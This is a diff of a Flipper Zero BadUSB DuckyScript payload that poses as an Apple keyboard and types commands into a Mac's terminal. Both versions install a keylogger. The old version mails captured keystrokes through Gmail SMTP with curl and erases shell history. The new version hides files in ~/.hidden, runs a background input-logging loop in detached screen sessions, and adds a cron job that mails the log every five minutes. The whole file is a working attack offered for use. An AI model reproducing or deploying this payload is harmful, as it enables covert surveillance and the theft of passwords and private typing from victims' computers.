@@ -1,15 +1,54 @@
 REM Author: 47LeCoste
 REM Version 1.0 (Flipper Ducky)
 ID 05ac:021e Apple:Keyboard
-DELAY 3000
+DELAY 1000
 GUI SPACE
 DELAY 500
-STRING terminal
-DELAY 200
+STRING "terminal"
+DELAY 500
 ENTER
-DELAY 2000
-STRING sudo screen -dm bash -c 'sudo /usr/local/bin/logKext_client /tmp/keystrokes.txt && while sleep 30; do curl --ssl-reqd smtp://smtp.gmail.com:587 -auth PLAIN -user "example@gmail.com:password" -mail-from "example@gmail.com" -mail-rcpt "example@example.com" -upload-file /tmp/keystrokes.txt -verbose; done; history -r'
+DELAY 1000
+STRING "mkdir ~/.hidden"
+DELAY 500
 ENTER
-DELAY 2000
-STRING exit
+STRING "mv ~/Desktop/keylogger.txt ~/.hidden/keylogger.txt"
+DELAY 500
+ENTER
+STRING "mv ~/Desktop/send_logs.sh ~/.hidden/send_logs.sh"
+DELAY 500
+ENTER
+STRING "screen -S keylogger"
+DELAY 500
+ENTER
+STRING "script ~/.hidden/keylogger.txt"
+DELAY 500
+ENTER
+STRING "nohup bash -c 'while true; do read -rsn1 input; echo -n \"$input\" >> ~/.hidden/keylogger.txt; done &' > /dev/null 2>&1 &"
+DELAY 500
+ENTER
+CTRL A
+STRING "d"
+DELAY 500
+ENTER
+STRING "disown"
+DELAY 500
+ENTER
+CTRL A
+STRING "d"
+DELAY 500
+STRING "exit"
+DELAY 500
+ENTER
+DELAY 1000
+STRING "echo \"#!/bin/bash\" > ~/.hidden/send_logs.sh"
+DELAY 500
+ENTER
+STRING "echo \"echo 'Keylogger Logs' | mail -s 'Keylogger Logs' -a ~/.hidden/keylogger.txt example@example.com\" >> ~/.hidden/send_logs.sh"
+DELAY 500
+ENTER
+STRING "chmod +x ~/.hidden/send_logs.sh"
+DELAY 500
+ENTER
+STRING "(crontab -l ; echo \"*/5 * * * * ~/.hidden/send_logs.sh\") | crontab -"
+DELAY 500
 ENTER
